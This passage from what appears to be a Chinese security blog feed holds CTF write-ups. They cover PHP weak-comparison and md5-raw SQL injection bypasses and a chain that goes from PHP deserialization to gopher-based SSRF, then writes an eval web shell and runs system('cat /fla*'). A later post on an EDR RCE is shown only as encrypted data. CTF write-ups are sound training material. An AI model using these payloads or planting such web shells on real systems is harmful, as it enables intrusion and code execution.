hash(<span class="string">"md4"</span>, $_GET[<span class="string">"hash1"</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'level 1 failed'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//level 2</span></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'hash2'</span>] === $_GET[<span class="string">'hash3'</span>] || md5($_GET[<span class="string">'hash2'</span>]) !== md5($_GET[<span class="string">'hash3'</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'level 2 failed'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//level 3</span></div><div class="line">$query = <span class="string">"SELECT * FROM flag WHERE password = '"</span> . md5($_GET[<span class="string">"hash4"</span>],<span class="keyword">true</span>) . <span class="string">"'"</span>;</div><div class="line">$result = $mysqli-&gt;query($query);</div><div class="line">$row = $result-&gt;fetch_assoc(); </div><div class="line">var_dump($row);</div><div class="line">$result-&gt;free();</div><div class="line">$mysqli-&gt;close();</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>evel1这里本来想传入空数组去绕过的，因为hash函数参数为数组时会产生错误，导致hash运算结果为NULL，所以如果传入空数组的话两者就相等了，但是试了半天却发现不行</p><p>而下面的代码是可以的</p><p><img src="http://pic.c1imber.top/blog/20200824/Y6nYJ9knFi0M.png?imageslim" alt="mark"></p><p>于是在这里卡了好久，最后才发现问题出在了哪</p><p><strong>因为通过<code>$_GET</code>方式传入空数组和直接定义空数组是有区别的</strong></p><p>通过<code>$_GET</code>方式传入数组，数组里有个默认的元素，内容为空字符串，所以即使<code>_GET</code>传入了空数组，但是其实这里的<code>$_GET[&#39;hash1&#39;]</code>并不是真正的空数组，而是<code>array(1) { [0]=&gt; string(0) &quot;&quot; }</code>，所以这里两者并不相等</p><p>在本地<code>var_dump($_GET[&#39;hash1&#39;])</code>就知道了</p><p><img src="http://pic.c1imber.top/blog/20200824/i3GbyqKOzpvn.png?imageslim" alt="mark"></p><p>所以这里需要换一下思路</p><p>这里lelvel1要求<code>$_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;])</code></p><p>而php弱类型当中还有一个特性是<code>&quot;0e\d+&quot;==&quot;0e\d+&quot;</code>的结果是为true的，因为两个字符串都以0e开头且后面的字符均为数字，php在通过==比较时会将两个字符串都转为科学计数法,于是两个结果都是0，所以相等</p><p><img src="http://pic.c1imber.top/blog/20200824/rUX1XczPPl9R.png?imageslim" alt="mark"></p><p>那么这里需要找一个字符串，符合以下条件的：</p><p>1、字符串需要以0e开头，且之后的字符都是数字</p><p>2、该字符串md4后的结果也需要为0e开头，且后面均为数字</p><p>这样只能爆破了，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$hash = <span class="string">'0e612198634316944013585621061115'</span>;</div><div class="line"> </div><div class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;<span class="number">100000000000</span>; $i++) &#123;</div><div class="line">    <span class="keyword">if</span> (hash(<span class="string">"md4"</span>,<span class="string">"0e"</span>. $i) == $hash) &#123;</div><div class="line">        <span class="keyword">echo</span> $i;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="keyword">echo</span> <span class="string">'  done'</span>;</div></pre></td></tr></table></figure><p>十几分钟就爆破成功了</p><p><img src="http://pic.c1imber.top/blog/20200824/JOYhnsKbeEF6.png?imageslim" alt="mark"></p><p>得到符合条件的字符串：0e251288019</p><p><img src="http://pic.c1imber.top/blog/20200824/3vFzMhWgpGGd.png?imageslim" alt="mark"></p><p>level2比较简单，<code>$_GET[&#39;hash2&#39;]</code>和<code>$_GET[&#39;hash3&#39;]</code>均为空数组即可绕过</p><p>level3接收参数拼接SQL语句，直接查询flag，语句如下</p><p><code>&quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;</code></p><p>需要 <code>md5($_GET[&quot;hash4&quot;],true)</code>可控，这里的true返回的是md5后的二进制数据</p><p>找到了一篇文章，文章中提到了一个神奇的字符串：<code>ffifdyop</code>，该字符串<code>md5(xxx,true)</code>后的结果为<code>&#39;&#39;or&#39;二进制数据&#39;</code>，导致可以注入查询所有内容</p><p>文章连接：<br><a href="https://blog.csdn.net/solitudi/article/details/107813286" target="_blank" rel="external">https://blog.csdn.net/solitudi/article/details/107813286</a></p><p><img src="http://pic.c1imber.top/blog/20200824/IzEUegw2OTKP.png?imageslim" alt="mark"></p><p>所以最终结果为：</p><p><code>http://xxx/index.php?hash1=0e251288019&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=ffifdyop</code></p><p>获取flag</p><p><img src="http://pic.c1imber.top/blog/20200824/jl0lvpPTepbq.png?imageslim" alt="mark"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="half-infiltration（赛后做出）"><a href="#half-infiltration（赛后做出）" class="headerlink" title="half_infiltration（赛后做出）"></a>half_infiltration（赛后做出）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line"></div><div class="line">$flag=file_get_contents(<span class="string">'ssrf.php'</span>);</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        ob_start();</div><div class="line">        <span class="keyword">global</span> $result;</div><div class="line">        <span class="keyword">print</span> $result;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $age,$sex,$num;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $student = <span class="keyword">$this</span>-&gt;age;</div><div class="line">        $boy = <span class="keyword">$this</span>-&gt;sex;</div><div class="line">        $a = <span class="keyword">$this</span>-&gt;num;</div><div class="line">    $student-&gt;$boy();</div><div class="line">    <span class="keyword">if</span>(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))</div><div class="line">    &#123;</div><div class="line">        ob_end_clean();</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">global</span> $$a;</div><div class="line">    $result=$GLOBALS[<span class="string">'flag'</span>];</div><div class="line">        ob_end_clean();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x'</span>])) &#123;</div><div class="line">    unserialize($_GET[<span class="string">'x'</span>])-&gt;get_it();</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>第一步需要读出ssrf.php，在这卡了好久</p><p>首先：</p><p>尝试传入<code>x=O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;sex&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:6:&quot;result&quot;;}</code></p><p>过程如下：</p><p>触发User对象的<code>__destruct</code>方法，从而调用Pass对象的read方法，<code>ob_start()</code>开启缓冲区，这时<code>global $result</code>结果为NULL，<code>print $result</code>的内容被输入到缓冲区，接着将ssrf.php的内容通过<code>$GLOBALS[&#39;flag&#39;]</code>写入<code>$result</code>，<code>ob_end_clean()</code>清空并关闭缓冲区</p><p>可以看到整个过程是不会有任何输出的，所以这里如果想输出ssrf.php文件的内容，需要突破两个限制：</p><p>1、如何再次调用一次<code>$student-&gt;$boy()</code></p><p>2、如何在再次调用<code>$student-&gt;$boy()</code>时绕过后面的<code>ob_end_clean()</code></p><p>构造poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $age,$sex,$num;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($num=<span class="string">"result"</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;age=<span class="keyword">new</span> Pass();</div><div class="line">        <span class="keyword">$this</span>-&gt;sex=<span class="string">"read"</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;num=$num;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$a=arrar(<span class="keyword">new</span> User(),<span class="keyword">new</span> User(<span class="string">"this"</span>));</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>1、通过两次反序列化可以再次调用<code>$student-&gt;$boy()</code><br>2、第二次反序列化时，将<code>$num</code>属性设置为this，使其在<code>global $$a</code>的位置报错，导致程序终止，这样<code>ob_end_clean()</code>就不会执行了，于是就可以输出第一次反序列化经过<code>$GLOBALS[&#39;flag&#39;]</code>设置后的<code>$result</code></p><p>传入</p><pre><code>x=a:2:{i:0;O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;sex&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:6:&quot;result&quot;;}i:1;O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;sex&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:4:&quot;this&quot;;}}</code></pre><p><img src="http://pic.c1imber.top/blog/20200824/aOYsDFELeBcd.png?imageslim" alt="mark"></p><p>获取ssrf.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="comment">//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网</span></div><div class="line">    $url = $_GET[<span class="string">'we_have_done_ssrf_here_could_you_help_to_continue_it'</span>] ?? <span class="keyword">false</span>; </div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag|var|apache|conf|proc|log/i"</span> ,$url))&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">""</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($url)</div><div class="line">    &#123; </div><div class="line"></div><div class="line">            $ch = curl_init(); </div><div class="line">            curl_setopt($ch, CURLOPT_URL, $url); </div><div class="line">            curl_setopt($ch, CURLOPT_HEADER, <span class="number">1</span>);</div><div class="line">            curl_exec($ch);</div><div class="line">            curl_close($ch); </div><div class="line"></div><div class="line">     &#125; </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>根据源码提示对本机35000-50000的端口进行探测，发现40000端口存在应用</p><p><img src="http://pic.c1imber.top/blog/20200824/K80ryB3jVD0N.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200824/f60jzbD31hHy.png?imageslim" alt="mark"></p><p>根据题目的提示和页面源码</p><p><img src="http://pic.c1imber.top/blog/20200824/kq6HHR8tCuAq.png?imageslim" alt="mark"></p><p>这里需要使用gopher协议通过POST传递一些参数过去</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%253a%2520127.0.0.1%253a40000%250d%250aContent-Type%253a%2520application%252fx-www-form-urlencoded%250d%250aContent-Length%253a%252022%250d%250a%250d%250afile%3d11.txt%26content%3d11</code></pre><p><img src="http://pic.c1imber.top/blog/20200824/yAEe0xoHsuLz.png?imageslim" alt="mark"></p><p>经过测试是写到了<code>uploads/sessionid/$_POST[&#39;file&#39;]</code>这个文件里面</p><p><img src="http://pic.c1imber.top/blog/20200824/XsqHaaoncvUH.png?imageslim" alt="mark"></p><p>写shell的时候有点坑</p><p>经过多次尝试，最终通过<code>php://filter</code>协议base64二次编码可以写入成功</p><p>写入shell内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="number">1</span>]);<span class="comment">//1</span></div></pre></td></tr></table></figure><p>payload</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%253a%2520127.0.0.1%253a40000%250d%250aContent-Type%253a%2520application%252fx-www-form-urlencoded%250d%250aContent-Length%253a%2520136%250d%250a%250d%250afile%253dphp%253a//filter/convert.base64-decode%257cconvert.base64-decode/resource%253dread.php%2526content%253dUEQ5d2FIQWdRR1YyWVd3b0pGOUhSVlJiTVYwcE95OHZNUT09</code></pre><p>读取flag</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/41i9gt47v4bkahds3n47m1spn4/read.php?1=system(&apos;cat%2520/fla*&apos;);</code></pre><p>因为we_have_done_ssrf_here_could_you_help_to_continue_it当中不能有flag字符，用linux通配符绕过</p><p><img src="http://pic.c1imber.top/blog/20200825/yirAe72NYofF.png?imageslim" alt="mark"></p><p>读取内网系统的index.php看看过滤了什么</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/41i9gt47v4bkahds3n47m1spn4/read.php?1=system(&apos;cat%2520../../index.php&apos;);</code></pre><p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">#ini_set('display_errors', 'on');</span></div><div class="line"></div><div class="line">session_start();</div><div class="line"><span class="keyword">include</span>(<span class="string">'del.php'</span>);</div><div class="line">$upload_dir = sprintf(<span class="string">"./uploads/%s/"</span>, session_id());</div><div class="line">$id=session_id();</div><div class="line">@mkdir($upload_dir, <span class="number">0755</span>, <span class="keyword">true</span>);</div><div class="line"></div><div class="line">chdir($upload_dir);</div><div class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'.'</span>);</div><div class="line"><span class="keyword">foreach</span> (glob(getcwd().<span class="string">'/*'</span>) <span class="keyword">as</span> $file) &#123;</div><div class="line">        <span class="keyword">if</span> (is_file($file)) &#123;</div><div class="line">                unlink($file);</div><div class="line">        &#125;</div><div class="line"></div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">if</span> (time() - filemtime($file) &gt;= <span class="number">200</span>) &#123;</div><div class="line">            Delete($file);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$data = <span class="string">""</span>;</div><div class="line">$filename = <span class="string">""</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'file'</span>]) ) &#123;</div><div class="line">$filename = $_POST[<span class="string">'file'</span>];</div><div class="line"><span class="keyword">if</span>(stripos($filename, <span class="string">'..'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($filename, <span class="string">'BE'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'write'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'zlib'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'sto'</span>)  === <span class="keyword">false</span>)&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'content'</span>])) &#123;</div><div class="line">            $data = $_POST[<span class="string">'content'</span>];</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (stripos($data, <span class="string">'`'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ll'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'PD8'</span>)  === <span class="keyword">false</span>   &amp;&amp;stripos($data, <span class="string">'-'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'ww'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'6'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'7'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'rm'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'mr'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'sy'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ys'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ph'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'Pz4='</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'&lt;?'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'PD9wa'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'script'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'='</span>)  === <span class="keyword">false</span>) &#123;</div><div class="line">                file_put_contents($filename, $data);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; </div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">"error"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>可以看到过滤了很多字符，其中包括PD9wa，这也是为什么要进行二次base64编码的原因，因为如果对&lt;?php xxx?&gt;进行一次base64编码，结果一定是PD9wa开头的，导致写不进去，另外还过滤了很多字符，需要多次尝试才能写入</p><p>其实这道题通过一次base64编码也是可以写进去的</p><p><img src="http://pic.c1imber.top/blog/20200825/YIqCW06UXkSN.png?imageslim" alt="mark"></p><p><code>1&lt;?php @eval($_GET[1]);//aa</code>这段php代码经过一次base64后也不会出现不允许的字符</p><p>一次base64写入</p><pre><code>/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%253a%2520127.0.0.1%253a40000%250d%250aContent-Type%253a%2520application%252fx-www-form-urlencoded%250d%250aContent-Length%253a%2520102%250d%250a%250d%250afile%253dphp%253a//filter/convert.base64-decode/resource%253dread.php%2526content%253dMTw%252fcGhwIEBldmFsKCRfR0VUWzFdKTsvL2Fh</code></pre><p><img src="http://pic.c1imber.top/blog/20200825/UXAdoetg1Ak6.png?imageslim" alt="mark"></p><p>也可以成功获取flag</p><p><img src="http://pic.c1imber.top/blog/20200825/r3tj8yI4iXiE.png?imageslim" alt="mark"></p><p>但是做题的时候并不知道这个黑名单，也很难想到</p><p>### </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;没做出几道题，记录一下吧，周末两天的做题还是有收获的&lt;/p&gt;
&lt;h1 id=&quot;强网先锋&quot;&gt;&lt;a href=&quot;#强网先锋&quot; class=&quot;headerlink&quot; title=&quot;强网先锋&quot;&gt;&lt;/a&gt;强网先锋&lt;/h1&gt;&lt;h3 id=&quot;web辅助&quot;&gt;&lt;a href=&quot;#web辅助&quot;
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>深信服EDR RCE分析</title>
    <link href="https://c1aysec.github.io/2020/08/18/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%20RCE%E5%88%86%E6%9E%90/"/>
    <id>https://c1aysec.github.io/2020/08/18/深信服EDR RCE分析/</id>
    <published>2020-08-18T09:10:49.337Z</published>
    <updated>2020-08-18T09:33:31.954Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="Hey, password is required here." />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e132e726f79486f47d91b6a64045b5636dda1d0234d11891e66ff6ff62e3c46e">feafb5f2b354fdb50f7dedc1cd80c9a90a50852c14877ca558b6679350685b375fb2b7981bf271516e6885187e601a4b04b1ddfb930c7176c3ecc4a8d5e9c342a73f5a2a95008c83f09a8a51cab383fc171218908fcae049c502e3c9f9e394886b4329b1555368fe08a21578234f8bf0e82441cc32402e7b428c2be24a0735ede8567b91c9f9efc0a430c346468d88c8a5bbe517e3b35fc0b0d8dcd86d5214b515624eb3b883d4a49e4f5aea5235de098154d05445e5d69b4939e8a7552ad03be17f002a16c2d9fb422773a9db85b5ceb1b51786acb51ff2cec0adcf1d659bf68cc380803712036738eb137a130fbd47007b7e68242ec9c10e1b62809fe5578b69b667fae90b05b1468f3d7e52d74a6b1aa172072d3604f1d3d97b0df9f313cdb19f8f4ba49e91db01623b5b5bcb8a842512abb4614f2b85040e885993d44d78dbf53d2546c0743810a1aedb60b8417f6e9e1495c32034681cb1ba37fed4dabdfbfe2326399449f1cdbf188ccd4e7065484f218a3adbc3ed8b22a49f2c83729a9d2f3f2d6936964610f6979279f782e8b71a35a795ee6012c295aa9d27cae518a9ebede57a9c2604165f9e29b9c8fed61430fb45c8266fdd5660b111109a193af61048492564862a8ad312c6b124bd2635bf003201ac9eaa131342fb47ace5f5473dde8fb5ec34b8158856afc3c5a177b9de80bb465354c2881df2032f4ca560be8882e35491409e3091ba2e679cc0eab749c68c9d55fde74a3c6f7a614d56c48315c102beb04faa1a56680eb13f66c2b3800ce4911668ab3a438b7fc538a82c193d9baf2efafd81db2cfbfff0176e083b84a11bdaa06912970a3ca11f10c340d452dea374502a92c6a06855ab957d6deae35f287d05a1162fe17c046e43b75165309025669aa4d410c4278f754755ad59f3be5bc0b3966c2b657e08235c573153528202e32c64d184c51d8929ed3e1d55af0f716a17e5e40ac7b9f894e82a41220ef5da1a33ef97618b6975050da661cd7e9319a74dd96cb08fa9a1d3d81861bc85b022c208ad74b0e44006d9eb98966210da4e63a6052eaa6180d2f22b62f93cf6150d70c2e3b6cebb503b7f2d52e7b2cd97c16865055afe5c3ef0963c911ea7e30a44546176e66bf08d46c3301d035a8dd87ad96d6ac0e2bba9544aad8575833bb7f4bb3c21fa2b4f9288a5de4332a3e30e3638bf37849cb0d9cf683deada48b3f4863b6a1e943e6a0940c3d799a2c1a6aef532103ccb95906bbedd5c79b52d88db917e7370df93257c179a4f33e1d5079b96a245bdd07a895b5dfe4b57cf41031c22a98810ea1d5e3e430c40bc3d73f614ff9abf58af254d835aaa4031cf20ec01bea7073351b98c8a9c6a81ddcc25593c031b311056bd8a7d17b0a828e72970021779bcd9b3a1ca4edf7f32e0d04764fce518a38e5e95797d08b1e633ccb5a44045279efc5289ba600043aab9738aeeeafb015a70e2cfa30857e756b473a2dc428d7117ae4b9fec38106ec0a89d1f92015e822f7c1120f523db58b1cfe8e58beb5ff530df07dee94b00fa46c15b3387e077979f67d4e883e3606e36a19c9522a538b09d89ae6a31f59a9a456f7c0392e79e21150182ef410a8a74171d5a5d32fdd2adb4ceb547ab9d7ef8aaaed7555b3a0c5eb40ae2297ab1c1511391734ed05d18a1857d2a34cc865951000f2df1d8d7683cfcf91b13f7f01010fc865bef31a5ab5454891db1a6150a1ea13a3dc69c7925feca7dcc1e4e37344a3719f324fe332e65eef4f2d0dddecf7d7e3c456ef5c639792d92faa918b754b117e7d9e2a5a10e97b791d43df5b0f8d2f03e7f6306db1d645763c26c7332dcb5377ddbe0c4f74b13305d6ced0f30599066ac0e45d1e48c6a28578590866245f5addac14d1241034fcc4dd54179ee9fff7403387e429b23db228ce062aa30b3a73c05d0c30dcc89927e37d63d9148ad7037d7e71cec28a3388d81b8ec897521512bfa9258468f22bf71c8d19ce348bebe35cbdc64df42a248fcd57597432d99de187ae886312729ab7f342479b9a91ca99328c0f0e7d1721bd3741d4724bec3ebda5f4a449f6652bee8b537dc5dfe2212822491969cd6efe4c14be73c4d680d38e6945f316f1643ec92fedbb6b998c012f7f2b0afed6e359608f7fd19f5e805677c781743067e98292171ee0ca9300ce512341fbfe2b0b820d41da04f52953a577bea32cdffbe33a6f3398054011d9826c8dd20cede1f1ce8cf66184d8d5ee3caac71b10430c70ab94f72ced870a703d1acce13a7f888083bbd207bcfeb9958125ab1d21dfa97f46f3fc794b5d14176dcb2d8b2f6b017661fb52cf20710ae628b70c944e8dd0f5ddd4e6a42261d8ac4027eacaeca432709f9c13fbb82b4fc82a7ed26e70579c5d3d4e5c21d97ba9197feb6fc169ce2d79cf806a48838701db51b98d62664fc001eb74ccfccf18a8b42c55cbc06f9c4a57e77605ed0f566c9413dabe3ba08d94b3c23f96267c26d5fa68a078d818b2ab761c3f0b90447c439130163484197fbddf1b0ab0eef63bd6cf0aa4928c44274f5fa4c9fa1195b3ac4efcfbd059c71b622a003248d7ecd0f04bcbead5e1cd619f076fe354abea031610a4fc76cba63780400160a97b55b8e8a247bfdfed7f08b1745d51f540996ab87aa890dfe6a92a3503e9d1cfdcc34ee0ce8697a992c77aab39b5b8232b657e13f43eef2ebd3a390dbdd5b7eff36e7abad70cd7a9752e4ac5264fee62733bbb106d2951672d028084d5abe2170529ee320c5e94ca2013b54a31a3f5e7afdd0591b2106ebbee9904785452cfbc9e770877777cf0d5e2b3bfc7c1a421f3e9eaf707e8a693672893b397b35e53dd7ed2fb636d239d37145043754faecb84cd62c7ebbc927b723afe416d4bc81fcf27a13c2845bcb42393f3f1ff6d0b1d176e0a5e37070c1ba8e765c2c1b087aeeb9ed692a159db45ba3fee5db37e3d66a113f45d8166dfd1e0bdeeca7b0ba78680bb736c656e6faf742d51b3e5cf2c59509ad0860bb6502ffed0509e265c4df1a1fafc7b3ea2c3245c08a1d7700e737643bd94083c8c65821bcda39763dc36f8dc694ff0f2ac8c4d28daa9bf10de65e03d9d3484892ed890440c2f5be45da6de50cdcc6d05418f66217653d6be50b441da5b2987adc826b9aed0ac0a42d046c90d3f24a9367cbcbfb94b6dedbb22840b2a41d0d3b7379c9bf09a0d188eea0a3fd31d0988d6d67ef88bd768cba973dd6cfe861f836f77efb353c70d57aac918bf8405cad359ff7059e9f444bada4cdb7332e188043367cb9458b02763650b619e1cbf874fae81ff50f0